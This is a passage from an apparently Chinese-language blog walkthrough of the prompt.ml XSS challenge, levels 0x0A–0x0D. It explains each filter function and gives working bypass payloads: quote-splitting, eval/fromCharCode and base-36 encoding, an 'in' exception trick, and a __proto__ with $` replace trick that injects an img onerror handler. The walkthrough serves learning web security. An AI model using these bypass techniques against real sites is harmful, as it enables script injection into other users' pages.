class="undefined"></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">========================================================================</span><br></pre></td></tr></table></figure><h4 id="⑥-xss-类型-9"><a href="#⑥-xss-类型-9" class="headerlink" title="⑥ xss 类型"></a><code>⑥ xss 类型</code></h4><blockquote><p>这是一道 ECMAScript 绕过的题目，但是涉及的知识点很多。</p></blockquote><h3 id="0x0A-绕过题目"><a href="#0x0A-绕过题目" class="headerlink" title="0x0A 绕过题目"></a><font color="navy">0x0A 绕过题目</font></h3><h4 id="①-JS-代码-10"><a href="#①-JS-代码-10" class="headerlink" title="① JS 代码"></a><code>① JS 代码</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// (╯°□°）╯︵ ┻━┻</span></span><br><span class="line">    input = <span class="built_in">encodeURIComponent</span>(input).replace(<span class="regexp">/prompt/g</span>, <span class="string">'alert'</span>);</span><br><span class="line">    <span class="comment">// ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro</span></span><br><span class="line">    input = input.replace(<span class="regexp">/'/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;'</span> + input + <span class="string">'&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="②-题目分析-10"><a href="#②-题目分析-10" class="headerlink" title="② 题目分析"></a><code>② 题目分析</code></h4><blockquote><p>首先是将输入进行一次 <code>encodeURIComponent</code> 编码，然后将 <code>prompt</code> 替换为 <code>alert</code> ，最后又将 <code>&#39;</code> 过滤掉。</p></blockquote><h4 id="③-相关知识点-10"><a href="#③-相关知识点-10" class="headerlink" title="③ 相关知识点"></a><code>③ 相关知识点</code></h4><blockquote><ol><li><code>decodeURIComponent()</code> 函数的作用；</li><li>绕过的思想</li></ol></blockquote><h4 id="④-payload-9"><a href="#④-payload-9" class="headerlink" title="④ payload"></a><code>④ payload</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1：prompt(p<span class="string">'rompt(1)) &amp; alert(p'</span>rompt(<span class="number">1</span>))</span><br><span class="line">payload2：<span class="built_in">eval</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">112</span>).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">114</span>)).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">111</span>)).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">109</span>)).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">112</span>)).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">116</span>)).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">40</span>)).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">49</span>)).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">41</span>)))</span><br></pre></td></tr></table></figure><p><code>payload1</code>：</p><blockquote><p>主要说一下绕过的思想，通过对 <code>&#39;</code> 符号的过滤，我们可以利用这一特性来构造 payload。</p><p>注：<code>&#39;</code> 的位置和数量是可以变的，只要在 <code>prompt</code> 单词内部。</p></blockquote><p><code>payload2</code>：</p><blockquote><p>构造 payload2 时花了很长时间，一开始是用 <code>JS 解析器</code> 在解析标识符名称时（如<code>函数名</code>、<code>属性名</code>）等，若遇到 <code>Unicode</code> 会直接进行解码，并使得标识符依旧生效。于是构造了这个 payload： <code>\u0070\u0072\u006f\u006d\u0070\u0074(1)</code> </p><p>绕过 <code>replace</code> 以在前端直接构造 <code>prompt(1)</code> , 但是 <code>\</code> 被 <code>encodeURIComponent</code> 转码成了 <code>%5C</code> ，失败。后来又想到 <code>eval</code> 函数，于是构造这个 payload：</p><p> <code>eval(String.fromCharCode(112,114,111,109,112,116,40,49,41))</code></p><p>期望可以绕过 <code>replace</code> 逐字符构造 <code>prompt(1)</code> ，但是 <code>,</code> 被 <code>encodeURIComponent</code> 转码成了 <code>%2C</code> ，还是失败。转念一想，既然不能用逗号 <code>,</code> 拼接字符，那么直接用 <code>concat</code> 函数就可以了，于是构造了 <code>payload2</code>。</p></blockquote><h4 id="⑤-HTML-source-10"><a href="#⑤-HTML-source-10" class="headerlink" title="⑤ HTML source"></a><code>⑤ HTML source</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1：&lt;script&gt;alert(prompt(<span class="number">1</span>))&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">payload2：&lt;script&gt;eval(String.fromCharCode(112).concat(String.fromCharCode(114)).concat(String.fromCharCode(111)).concat(String.fromCharCode(109)).concat(String.fromCharCode(112)).concat(String.fromCharCode(116)).concat(String.fromCharCode(40)).concat(String.fromCharCode(49)).concat(String.fromCharCode(41)))&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure><h4 id="⑥-xss-类型-10"><a href="#⑥-xss-类型-10" class="headerlink" title="⑥ xss 类型"></a><code>⑥ xss 类型</code></h4><blockquote><p>简单一个根据 JS 规则，来进行绕过问题。</p></blockquote><h3 id="0x0B-In-Exception"><a href="#0x0B-In-Exception" class="headerlink" title="0x0B In Exception"></a><font color="navy">0x0B In Exception</font></h3><h4 id="①-JS-代码-11"><a href="#①-JS-代码-11" class="headerlink" title="① JS 代码"></a><code>① JS 代码</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// name should not contain special characters</span></span><br><span class="line">    <span class="keyword">var</span> memberName = input.replace(<span class="regexp">/[[|\s+*/\\&lt;&gt;&amp;^:;=~!%-]/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// data to be parsed as JSON</span></span><br><span class="line">    <span class="keyword">var</span> dataString = <span class="string">'&#123;"action":"login","message":"Welcome back, '</span> + memberName + <span class="string">'."&#125;'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// directly "parse" data in script context</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'                                \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                    \n\</span></span><br><span class="line"><span class="string">    var data = '</span> + dataString + <span class="string">';          \n\</span></span><br><span class="line"><span class="string">    if (data.action === "login")            \n\</span></span><br><span class="line"><span class="string">        document.write(data.message)        \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="②-题目分析-11"><a href="#②-题目分析-11" class="headerlink" title="② 题目分析"></a><code>② 题目分析</code></h4><blockquote><p>这道题目可以简化为：</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">'"Welcome back, '</span> + input + <span class="string">'."'</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>其中 <code>input</code> 是我们输入的内容，允许输入的字符只有 <code>a-z</code>、<code>A-Z</code>、<code>0-9</code>、<code>&quot;</code>、<code>&#39;</code>、<code>(</code>、<code>)</code> 。</p></blockquote><h4 id="③-相关知识点-11"><a href="#③-相关知识点-11" class="headerlink" title="③ 相关知识点"></a><code>③ 相关知识点</code></h4><blockquote><ol><li>英文下的符号</li><li>JS 的异常机制： JS 会把 <code>()</code> 前面的字符串识别是 函数名，但由于函数不存在，会抛出异常，换言之， <code>()</code> 里面可能会被识别为函数的参数表，<strong>参数表优先于函数名被解析</strong>。</li><li>JavaScript 的 <code>in</code> 和 <code>instanceof</code>的语法</li></ol></blockquote><h4 id="④-payload-10"><a href="#④-payload-10" class="headerlink" title="④ payload"></a><code>④ payload</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1:<span class="string">"(prompt(1)) instanceof "</span> </span><br><span class="line">payload2:<span class="string">"(prompt(1)) in "</span></span><br></pre></td></tr></table></figure><blockquote><p>如果我们只是输入 <code>&quot;(prompt(1))&quot;</code> 的话，那么 <code>HTML source</code> 的结果是这样的：</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;                                    </span><br><span class="line">    <span class="keyword">var</span> data = &#123;<span class="string">"action"</span>:<span class="string">"login"</span>,<span class="string">"message"</span>:<span class="string">"Welcome back, "</span>(prompt(<span class="number">1</span>))<span class="string">"."</span>&#125;;          </span><br><span class="line">    <span class="keyword">if</span> (data.action === <span class="string">"login"</span>)            </span><br><span class="line">        <span class="built_in">document</span>.write(data.message)        </span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>需要注意到，在注入点的后面，还有一个小尾巴 <code>.</code> 。换言之，其实我们注入 <code>&quot;(prompt(1))&quot;</code> 这个 payload 后，得到的 JS 代码其实是这样的：<code>document.write(&quot;Welcome back, &quot;(prompt(1))&quot;.&quot;);</code>而这个小尾巴最致命的地方，就是它先于参数表的 <code>prompt(1)</code> 被解析，导致先抛出了一个 <code>SyntaxError</code> 语法错误的异常， <code>prompt(1)</code> 则无法被执行。</p><p>那么接下来就需要处理掉这个语法错误的问题，使得参数表可以被解析。但是由于 <code>+</code> 被过滤了，无法利用它拼接函数返回值和字符串去解决这个尾巴。不过 JS 还有一个 <code>in</code> （instanceof 也可以）操作符同样可以达到拼接目的，其使用方法是 <code>[a_object] in [b_object]</code> ，用于判断一个对象 a 是否被对象 b 包含。虽然 <code>in</code> 对 object 类型有要求，但是即使是类型错误，也只会在运行时抛出，而不会在最开始解析时就直接报语法错误，从而可以解决前面语法错误导致参数表的 <code>prompt(1)</code> 没有被解析的问题。</p></blockquote><p><code>执行顺序</code></p><blockquote><ul><li>解析并执行参数表的 <code>prompt(1)</code> （<strong>已经足以完成挑战</strong>）</li><li>抛出 <code>Welcome back,</code> 函数未定义异常</li><li>抛出 <code>in</code> 操作符的 <code>TypeError</code> 异常</li></ul></blockquote><h4 id="⑤-HTML-source-11"><a href="#⑤-HTML-source-11" class="headerlink" title="⑤ HTML source"></a><code>⑤ HTML source</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;                                    </span><br><span class="line">    <span class="keyword">var</span> data = &#123;<span class="string">"action"</span>:<span class="string">"login"</span>,<span class="string">"message"</span>:<span class="string">"Welcome back, "</span>(prompt(<span class="number">1</span>))<span class="keyword">in</span><span class="string">"."</span>&#125;;          </span><br><span class="line">    <span class="keyword">if</span> (data.action === <span class="string">"login"</span>)            </span><br><span class="line">        <span class="built_in">document</span>.write(data.message)        </span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h4 id="⑥-xss-类型-11"><a href="#⑥-xss-类型-11" class="headerlink" title="⑥ xss 类型"></a><code>⑥ xss 类型</code></h4><blockquote><p>In Exception 的题型</p></blockquote><h3 id="0x0C-toString-函数"><a href="#0x0C-toString-函数" class="headerlink" title="0x0C toString 函数"></a><font color="navy">0x0C toString 函数</font></h3><h4 id="①-JS-代码-12"><a href="#①-JS-代码-12" class="headerlink" title="① JS 代码"></a><code>① JS 代码</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// in Soviet Russia...</span></span><br><span class="line">    input = <span class="built_in">encodeURIComponent</span>(input).replace(<span class="regexp">/'/g</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="comment">// table flips you!</span></span><br><span class="line">    input = input.replace(<span class="regexp">/prompt/g</span>, <span class="string">'alert'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ノ┬─┬ノ ︵ ( \o°o)\</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;'</span> + input + <span class="string">'&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="②-题目分析-12"><a href="#②-题目分析-12" class="headerlink" title="② 题目分析"></a><code>② 题目分析</code></h4><blockquote><p>该题和 <code>0x08</code> 题目相似，但是仔细看却发现两个replace的位置有所改变，思路也有所改变。</p></blockquote><h4 id="③-相关知识点-12"><a href="#③-相关知识点-12" class="headerlink" title="③ 相关知识点"></a><code>③ 相关知识点</code></h4><blockquote><ol><li><code>parseInt()</code> 和 <code>toString()</code>  函数的相关知识点；</li><li><code>eval()</code> 函数的相关知识点</li><li><code>String</code> 的相关属性，比如<code>fromCharCode()</code> 和 <code>concat()</code></li></ol></blockquote><h4 id="④-payload-11"><a href="#④-payload-11" class="headerlink" title="④ payload"></a><code>④ payload</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload1:<span class="built_in">eval</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">112</span>).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">114</span>)).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">111</span>)).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">109</span>)).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">112</span>)).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">116</span>)).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">40</span>)).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">49</span>)).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">41</span>)))</span><br><span class="line"></span><br><span class="line">payload2:<span class="built_in">eval</span>((<span class="number">1558153217</span>).toString(<span class="number">36</span>).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">40</span>)).concat(<span class="number">1</span>).concat(<span class="built_in">String</span>.fromCharCode(<span class="number">41</span>)))</span><br><span class="line"></span><br><span class="line">payload3:prompt(<span class="built_in">eval</span>((<span class="number">630038579</span>).toString(<span class="number">30</span>))(<span class="number">1</span>))</span><br></pre></td></tr></table></figure><blockquote><p>第一个 payload 是 <code>0x08</code> 题目的一个 payload，在这道题也照样能用。</p><blockquote><p> 在 JS 中存在一个函数 <code>parseInt(str, radix)</code> ，默认情况下，<code>radix = 10</code>，即它可以把十进制的数字字符串转换成十进制数。但是通过调整进制数 <code>radix</code> ，它可以把其他进制的字符串转换成十进制数。而当 <code>radix = 36</code> 时。它可以把只包含 <code>0-9a-z</code> （大小写不敏感）的字符串转换成十进制数。于是我们可以把 <code>prompt</code>  字符串转换成十进制数：<code>parseInt(&quot;prompt&quot;, 36)</code> ，得到 <code>1558153217</code>，而要将十进制数字还原成字符串，则可以使用另一个函数 <code>toString(radix)</code> （默认情况下 <code>radix = 10</code> ）。</p></blockquote><p>第二个payload是用<code>toString</code>函数简化后的payload，第三个是一个更简化的，因为没有必要对<code>(1)</code> 绕过。</p></blockquote><h4 id="⑤-HTML-source-12"><a href="#⑤-HTML-source-12" class="headerlink" title="⑤ HTML source"></a><code>⑤ HTML source</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">eval</span>((<span class="number">630038579</span>).toString(<span class="number">30</span>))(<span class="number">1</span>))&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h4 id="⑥-xss-类型-12"><a href="#⑥-xss-类型-12" class="headerlink" title="⑥ xss 类型"></a><code>⑥ xss 类型</code></h4><blockquote><p>编码绕过问题。</p></blockquote><h3 id="0x0D-JSON-Object"><a href="#0x0D-JSON-Object" class="headerlink" title="0x0D JSON Object"></a><font color="navy">0x0D JSON Object</font></h3><h4 id="①-JS-代码-13"><a href="#①-JS-代码-13" class="headerlink" title="① JS 代码"></a><code>① JS 代码</code></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// extend method from Underscore library</span></span><br><span class="line">    <span class="comment">// _.extend(destination, *sources) </span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">extend</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> source, prop;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>, length = <span class="built_in">arguments</span>.length; i &lt; length; i++) &#123;</span><br><span class="line">            source = <span class="built_in">arguments</span>[i];</span><br><span class="line">            <span class="keyword">for</span> (prop <span class="keyword">in</span> source) &#123;</span><br><span class="line">                obj[prop] = source[prop];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// a simple picture plugin</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// pass in something like &#123;"source":"http://sandbox.prompt.ml/PROMPT.JPG"&#125;</span></span><br><span class="line">        <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(input);</span><br><span class="line">        <span class="keyword">var</span> config = extend(&#123;</span><br><span class="line">            <span class="comment">// default image source</span></span><br><span class="line">            source: <span class="string">'http://placehold.it/350x150'</span></span><br><span class="line">        &#125;, <span class="built_in">JSON</span>.parse(input));</span><br><span class="line">        <span class="comment">// forbit invalid image source</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="regexp">/[^\w:\/.]/</span>.test(config.source)) &#123;</span><br><span class="line">            <span class="keyword">delete</span> config.source;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// purify the source by stripping off "</span></span><br><span class="line">        <span class="keyword">var</span> source = config.source.replace(<span class="regexp">/"/g</span>, <span class="string">''</span>);</span><br><span class="line">        <span class="comment">// insert the content using mustache-ish template</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;img src="&#123;&#123;source&#125;&#125;"&gt;'</span>.replace(<span class="string">'&#123;&#123;source&#125;&#125;'</span>, source);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid image data.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="②-题目分析-13"><a href="#②-题目分析-13" class="headerlink" title="② 题目分析"></a><code>② 题目分析</code></h4><blockquote><p>这道题目的代码较多，在这里需要对代码仔细的分析一下：</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(input);</span><br><span class="line">        <span class="keyword">var</span> config = extend(&#123;</span><br><span class="line">            <span class="comment">// default image source</span></span><br><span class="line">            source: <span class="string">'http://placehold.it/350x150'</span></span><br><span class="line">        &#125;, <span class="built_in">JSON</span>.parse(input));</span><br></pre></td></tr></table></figure><blockquote><p>上面的代码要求我们输入的格式必须是 <code>JSON 格式</code>，然后 <code>input</code> 会与一个固定的 JSON <code>{ &#39;source&#39; : &#39;http://placehold.it/350x150&#39; }</code> 执行 <code>extend</code> 操作。处理后的 <code>input</code> JSON 对象存储到 <code>config</code> 变量中。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// extend method from Underscore library</span></span><br><span class="line">    <span class="comment">// _.extend(destination, *sources) </span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">extend</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> source, prop;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>, length = <span class="built_in">arguments</span>.length; i &lt; length; i++) &#123;</span><br><span class="line">            source = <span class="built_in">arguments</span>[i];</span><br><span class="line">            <span class="keyword">for</span> (prop <span class="keyword">in</span> source) &#123;</span><br><span class="line">                obj[prop] = source[prop];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>检测 <code>input</code> 的 JSON <strong>顶层</strong>是否具有属性 <code>source</code> ，若有则不对 <code>input</code> 做任何修改。否则则在 <code>input</code> 的 JSON <strong>顶层</strong> 添加属性 <code>source</code> ，且取默认值为 <code>http://placehold.it/350x150</code> 。实际上这个函数是没什么用的。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// forbit invalid image source</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="regexp">/[^\w:\/.]/</span>.test(config.source)) &#123;</span><br><span class="line">            <span class="keyword">delete</span> config.source;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><blockquote><p>继而利用 <code>test</code> 函数正则校验 <code>config</code> JSON 对象的<strong>顶层属性</strong> <code>source</code> 的值，若其值含有 <code>0-9</code>、 <code>a-z</code>、 <code>A-Z</code>、 <code>_</code>、 <code>:</code>、 <code>/</code>、 <code>.</code>、 以外的字符，则删除 <code>source</code> 属性。换言之这里是避免我们在<strong>顶层属性</strong> <code>source</code> 编写 payload 。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// purify the source by stripping off "</span></span><br><span class="line"><span class="keyword">var</span> source = config.source.replace(<span class="regexp">/"/g</span>, <span class="string">''</span>);</span><br></pre></td></tr></table></figure><blockquote><p>即使 <code>config</code> JSON 对象的<strong>顶层属性</strong> <code>source</code> 得以保留，也会把其中的双引号 <code>&quot;</code> 全部过滤。</p><p>换言之这行代码是避免我们闭合 JSON 属性。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// insert the content using mustache-ish template</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'&lt;img src="&#123;&#123;source&#125;&#125;"&gt;'</span>.replace(<span class="string">'&#123;&#123;source&#125;&#125;'</span>, source);</span><br></pre></td></tr></table></figure><blockquote><p>最后把 <code>source</code> 的值作为 <code>img</code> 标签的 <code>src</code> 属性值输出到前端。</p></blockquote><h4 id="③-相关知识点-13"><a href="#③-相关知识点-13" class="headerlink" title="③ 相关知识点"></a><code>③ 相关知识点</code></h4><blockquote><p>相当难的一道综合题型，考察对 Javascript 原理的理解程度，相关知识点如下：</p><ul><li><p>Object getter/setter 访问器（accessor）：<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/proto" target="_blank" rel="noopener">Object.prototype.__proto_</a></p></li><li><p>String 正则替换：<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace" target="_blank" rel="noopener">String.prototype.replace()</a> </p></li><li>标签 <code>&lt;img&gt;</code> 的构造 xss 的常用方法</li><li>String <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace#描述" target="_blank" rel="noopener">其他的属性</a></li></ul></blockquote><h4 id="④-payload-12"><a href="#④-payload-12" class="headerlink" title="④ payload"></a><code>④ payload</code></h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"source"</span>: <span class="string">"--EXP : Delete Me--"</span>, <span class="attr">"__proto__"</span>: &#123;<span class="attr">"source"</span>: <span class="string">"$` onerror=prompt(1) &gt;"</span>&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>因为代码太过于长，于是我打算先按照格式输入进去，看看 <code>HTML source</code> 的结果：</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://sandbox.prompt.ml/PROMPT.JPG"</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>原来 source 的值是 src 属性的值，对 <code>&lt;img&gt;</code> 标签来说，正常情况注入 JS，可以通过两个方式：</p></blockquote><ul><li><code>src = x onerror = prompt(1)</code>：通过加载图片的错误，调用 <code>onerror</code> 事件；</li></ul><blockquote><p>对于这种放法，因为双引号 <code>&quot;</code> 被过滤了，我们无法通过闭合 <code>src</code> 的双引号再增加 <code>onerror</code> 属性。<code>src = &quot;onerror = prompt(1)&quot;</code>，但是根据 JS 的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace#语法" target="_blank" rel="noopener"><code>replace(&#39;_posts/2020.02.27（96）.md&#39;, source)</code></a> 函数的语法，第二个由我们控制的参数 <code>source</code> 是可以插入<strong>特殊变量名</strong>以达到某些效果的（详见 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace#描述" target="_blank" rel="noopener">这里</a> ）。而我们要使用的特殊变量名，就是 <strong>$`</strong>，这个变量名的效果是<code>插入当前匹配的子串左边的内容</code>。就这题而言，因为 <code>&#39;.replace(&#39;_posts/2020.02.27（96）.md&#39;, source)</code> 第一个参数 <code>_posts/2020.02.27（96）.md</code> 匹配了原字符串，而所匹配部分的左边内容是 <code>&lt;img src=&quot;</code>，因此若第二个参数 <code>source</code> 含有特殊变量，就会把 <code>&lt;img src=&quot;</code>插入到该特殊变量位置。 注意所插入的到 <code>&lt;img src=&quot;</code>最右侧刚好有一个双引号，那么我们就可以用来闭合 <code>src</code> 属性的双引号了。于是我们可以构造 <code>source</code> 的值为 </p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="string">` onerror=prompt(1) &gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>当特殊变量被替换后，实际就等价于 <code>，再将其通过</code>replace<code>替换到原串的</code>_posts/2020.02.27（96）.md` ，就可以得到：</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&lt;img src="</span> <span class="attr">onerror</span>=<span class="string">prompt(1)</span> &gt;</span>"&gt;</span><br></pre></td></tr></table></figure><blockquote><p>即 <code>src</code> 属性值等于 <code>&quot; ，被成功闭合了，同时因为是一个无效值，会触发到</code>onerror` 的 JS 。</p><p>那么接下来的问题就是，怎么保留我们所构造的 <code>source</code> 值到最后。</p><p>根据前面的分析知道， <code>source</code> 值就是源于我们输入的 json 的  <code>source</code> 属性值。</p><p>但是在此之前有这样的一段 <code>test</code> 代码，当 <code>source</code> 值含有 <code>0-9</code>、 <code>a-z</code>、 <code>A-Z</code>、 